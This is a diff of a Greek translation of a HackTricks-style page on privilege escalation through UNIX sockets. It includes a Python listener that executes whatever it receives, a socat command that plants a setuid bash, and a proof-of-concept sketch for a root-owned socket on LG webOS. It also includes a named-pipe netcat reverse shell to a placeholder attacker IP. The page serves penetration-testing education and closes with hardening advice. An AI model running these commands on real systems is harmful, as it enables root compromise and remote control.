@@ -2,9 +2,9 @@
 
 {{#include ../../banners/hacktricks-training.md}}
 
-## Socket binding example with Python
+## Παράδειγμα σύνδεσης Socket με Python
 
-Στο παρακάτω παράδειγμα δημιουργείται ένας **unix socket** (`/tmp/socket_test.s`) και ό,τι **λαμβάνεται** θα **εκτελείται** από `os.system`. Ξέρω ότι δεν θα βρείτε κάτι τέτοιο στην άγρια φύση, αλλά ο στόχος αυτού του παραδείγματος είναι να δείξει πώς μοιάζει κώδικας που χρησιμοποιεί unix sockets και πώς να χειριστείτε την είσοδο στην χειρότερη δυνατή περίπτωση.
+Στο ακόλουθο παράδειγμα δημιουργείται ένας **unix socket** (`/tmp/socket_test.s`) και οτιδήποτε **λαμβάνεται** θα **εκτελεστεί** από την `os.system`. Ξέρω ότι δεν θα βρείτε κάτι τέτοιο στο wild, αλλά ο σκοπός αυτού του παραδείγματος είναι να δείξει πώς μοιάζει ένας κώδικας που χρησιμοποιεί unix sockets και πώς να χειριστείτε την είσοδο στη χειρότερη δυνατή περίπτωση.
 ```python:s.py
 import socket
 import os, os.path
@@ -26,7 +26,7 @@ print(datagram)
 os.system(datagram)
 conn.close()
 ```
-**Εκτέλεσε** τον κώδικα χρησιμοποιώντας python: `python s.py` και **έλεγξε πώς ακούει το socket**:
+**Εκτελέστε** τον κώδικα χρησιμοποιώντας python: `python s.py` και **ελέγξτε πώς ακούει το socket**:
 ```python
 netstat -a -p --unix | grep "socket_test"
 (Not all processes could be identified, non-owned process info
@@ -39,13 +39,13 @@ echo "cp /bin/bash /tmp/bash; chmod +s /tmp/bash; chmod +x /tmp/bash;" | socat -
 ```
 ## Μελέτη περίπτωσης: Root-owned UNIX socket signal-triggered escalation (LG webOS)
 
-Some privileged daemons expose a root-owned UNIX socket that accepts untrusted input and couples privileged actions to thread-IDs and signals. If the protocol lets an unprivileged client influence which native thread is targeted, you may be able to trigger a privileged code path and escalate.
+Μερικά privileged daemons εκθέτουν ένα root-owned UNIX socket που δέχεται untrusted input και συζεύγνυει privileged actions με thread-IDs και signals. Αν το protocol επιτρέπει σε έναν unprivileged client να επηρεάσει ποιο native thread στοχεύεται, μπορεί να καταφέρετε να ενεργοποιήσετε ένα privileged code path και να escalate.
 
 Observed pattern:
-- Συνδεθείτε σε έναν root-owned socket (e.g., /tmp/remotelogger).
+- Συνδεθείτε σε ένα root-owned socket (π.χ., /tmp/remotelogger).
 - Δημιουργήστε ένα thread και αποκτήστε το native thread id (TID).
-- Στείλτε το TID (packed) μαζί με padding ως αίτημα; λάβετε ένα acknowledgement.
-- Deliver a specific signal to that TID to trigger the privileged behaviour.
+- Στείλτε το TID (packed) μαζί με padding ως request; λάβετε ένα acknowledgement.
+- Στείλτε ένα συγκεκριμένο signal σε εκείνο το TID για να ενεργοποιήσετε το privileged behaviour.
 
 Minimal PoC sketch:
 ```python
@@ -59,14 +59,14 @@ s.sendall(struct.pack('<L', tid) + b'A'*0x80)
 s.recv(4)  # sync
 os.kill(tid, 4)  # deliver SIGILL (example from the case)
 ```
-Για να το μετατρέψετε σε root shell, μπορεί να χρησιμοποιηθεί ένα απλό named-pipe + nc pattern:
+Για να το μετατρέψετε σε root shell, μπορεί να χρησιμοποιηθεί ένα απλό named-pipe + nc μοτίβο:
 ```bash
 rm -f /tmp/f; mkfifo /tmp/f
 cat /tmp/f | /bin/sh -i 2>&1 | nc <ATTACKER-IP> 23231 > /tmp/f
 ```
 Σημειώσεις:
-- Αυτή η κατηγορία σφαλμάτων προκύπτει από την εμπιστοσύνη σε τιμές που προέρχονται από μη προνομιακή κατάσταση πελάτη (TIDs) και τη δέσμευσή τους σε privileged signal handlers ή λογική.
-- Ενισχύστε την ασφάλεια επιβάλλοντας έλεγχο διαπιστευτηρίων στο socket, επικυρώνοντας τις μορφές μηνυμάτων και αποσυνδέοντας privileged operations από εξωτερικά παρεχόμενα thread identifiers.
+- Αυτή η κατηγορία σφαλμάτων προκύπτει από την εμπιστοσύνη σε τιμές που προέρχονται από μη προνομιακή κατάσταση του client (TIDs) και τη σύνδεσή τους με προνομιακούς χειριστές σημάτων ή λογική.
+- Ενισχύστε την ασφάλεια εφαρμόζοντας διαπιστευτήρια στο socket, επικυρώνοντας τις μορφές μηνυμάτων και αποσυνδέοντας προνομιακές λειτουργίες από εξωτερικά παρεχόμενα αναγνωριστικά νημάτων.
 
 ## Αναφορές
 
